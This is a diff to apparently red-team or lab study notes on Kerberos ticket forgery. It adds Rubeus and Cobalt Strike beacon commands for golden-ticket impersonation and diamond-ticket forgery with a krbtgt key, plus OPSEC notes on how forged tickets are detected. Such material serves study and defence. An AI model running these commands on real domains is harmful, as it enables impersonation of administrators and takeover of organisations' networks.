@@ -42,7 +42,7 @@ ticket forgery:
                they may be detected as there is no TGS-REQ (4769) event logged before the TGS-REP (4624) since they are forged offline
                they may also be detected if they're forged with inaccurate or anomalous information
                 e.g. domain name should be in all caps!
-    another technique is forging a TGT that has been signed with the KDC's secret (obtained via DCSync)
+    another technique is forging a TGT offline that has been signed with the KDC's secret (obtained via DCSync)
     known as a golden ticket:
         using the KDC's secret:
             PS C:\Users\Attacker> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe golden /aes256:[secret] /user:Administrator /domain:CONTOSO.COM /sid:S-1-5-21-3926355307-1661546229-813047887 /nowrap
@@ -51,5 +51,18 @@ ticket forgery:
                     /user is the username to impersonate
                     /domain is the current domain
                     /sid is the current domain's SID
-
+        impersonate:
+            beacon> make_token CONTOSO\Administrator FakePass
+            beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe ptt /ticket:[TGS] 
+        OPSEC: same as silver ticket, where anomalous data would include lifetime data (mimikatz sets lifetime of ticket to 10 years)
+    another technique will request a legit TGT for a user, then use the KDC's secret to decrypt the ticket, change the necessary data, re-encrypt and re-sign the TGT with the secret
+    known as a diamond ticket:
+        beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe diamond /tgtdeleg /krbkey:512920012661247c674784eef6e1b3ba52f64f28f57cf2b3f67246f20e6c722c /ticketuser:Administrator /ticketuserid:500 /domain:CONTOSO.COM /nowrap
+            where...
+                /tgtdeleg uses the TGT delegation trick to obtain a usable TGT
+                /krbkey is the krbtgt's AES256 hash
+                /ticketuser is the user we want to impersonate
+                /ticketuserid is the impersonated user's RID
+                /domain is the current domain
+                
 dpapi backup keys
